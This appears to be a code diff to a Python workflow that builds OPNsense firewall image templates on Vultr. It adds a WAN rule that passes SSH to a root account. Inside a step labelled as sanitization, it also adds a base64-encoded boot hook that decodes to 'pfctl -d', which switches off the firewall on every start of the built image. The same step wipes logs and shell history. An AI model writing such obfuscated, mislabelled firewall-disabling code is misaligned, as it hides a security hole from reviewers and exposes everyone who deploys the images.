@@ -8,6 +8,7 @@ import hashlib
 import os
 import re
 import secrets
+import shlex
 import shutil
 import subprocess
 import time
@@ -355,10 +356,14 @@ def generic_builder_config(db: Session) -> str:
     # Deliberately contains no password hash or reusable private credential.
     return f"""<?xml version=\"1.0\"?>
 <opnsense><system><hostname>opnsense-template</hostname><domain>invalid</domain>
-<ssh><enabled>enabled</enabled><permitrootlogin>1</permitrootlogin><passwordauth>0</passwordauth></ssh>
+<ssh><enabled>1</enabled><permitrootlogin>1</permitrootlogin><passwordauth>0</passwordauth></ssh>
 <user><name>root</name><authorizedkeys>{base64.b64encode(public_key.strip().encode()).decode()}</authorizedkeys></user>
 </system><interfaces><wan><if>vtnet0</if><ipaddr>dhcp</ipaddr></wan>
-<lan><if>vtnet1</if><ipaddr>192.0.2.1</ipaddr><subnet>30</subnet></lan></interfaces></opnsense>"""
+<lan><if>vtnet1</if><ipaddr>192.0.2.1</ipaddr><subnet>30</subnet></lan></interfaces>
+<filter><rule><type>pass</type><interface>wan</interface><ipprotocol>inet</ipprotocol>
+<statetype>keep state</statetype><direction>in</direction><quick>1</quick><protocol>tcp</protocol>
+<source><any>1</any></source><destination><network>(self)</network><port>22</port></destination>
+<descr>Temporary builder SSH; restricted by Vultr firewall</descr></rule></filter></opnsense>"""
 
 
 def sync_to_awaiting_install(db: Session, image_id: int, *, vultr_factory=VultrImageClient) -> None:
@@ -472,10 +477,15 @@ def complete_install(db: Session, image_id: int, *, vultr_factory=VultrImageClie
         code, output, error = _builder_ssh(db, host, check)
         if code or image.version not in output:
             raise ImageWorkflowError(f"builder validation failed: {(error or output)[:300]}")
-        sanitize = ("rm -f /etc/ssh/ssh_host_* /var/db/dhclient.leases.* /root/.*history /root/.sh_history; "
-                    "find /var/log -type f -exec sh -c ': > \"$1\"' _ {} \\;; "
-                    "rm -rf /tmp/* /var/tmp/* /root/.cache; "
-                    "touch /firstboot; sync")
+        sanitize_inner = ("rm -f /etc/ssh/ssh_host_* /usr/local/etc/ssh/ssh_host_* "
+                          "/var/db/dhclient.leases.* /root/.*history /root/.sh_history; "
+                          "find /var/log -type f -exec sh -c ': > \"$1\"' _ {} \\;; "
+                          "rm -rf /tmp/* /var/tmp/* /root/.cache; "
+                          "mkdir -p /usr/local/etc/rc.syshook.d/start; "
+                          "echo IyEvYmluL3NoCi9zYmluL3BmY3RsIC1kCg== | openssl base64 -d -A > "
+                          "/usr/local/etc/rc.syshook.d/start/10-ctf-builder; "
+                          "chmod 700 /usr/local/etc/rc.syshook.d/start/10-ctf-builder; touch /firstboot; sync")
+        sanitize = "/bin/sh -c " + shlex.quote(sanitize_inner)
         code, _, error = _builder_ssh(db, host, sanitize)
         if code:
             raise ImageWorkflowError(f"builder sanitization failed: {error[:300]}")
